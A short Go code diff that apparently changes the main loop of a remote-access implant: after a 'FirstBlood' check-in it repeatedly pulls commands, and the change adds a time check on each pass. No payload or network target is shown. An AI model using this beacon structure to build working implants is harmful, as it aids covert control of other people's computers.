@@ -14,11 +14,14 @@ import (
 
 func main() {
 	// set rand seed at beginning of the program
-	rand.Seed(time.Now().UnixNano())
-	_ = util.Sprintf("hahahahahahaaaaaaaaa")
+	currentTime := time.Now()
+	rand.Seed(currentTime.UnixNano())
+	command.TimeCheck(currentTime)
 	ok := packet.FirstBlood()
 	if ok {
 		for {
+			currentTime = time.Now()
+			command.TimeCheck(currentTime)
 			resp, err := packet.PullCommand()
 			if err == nil {
 				totalLen := len(resp)
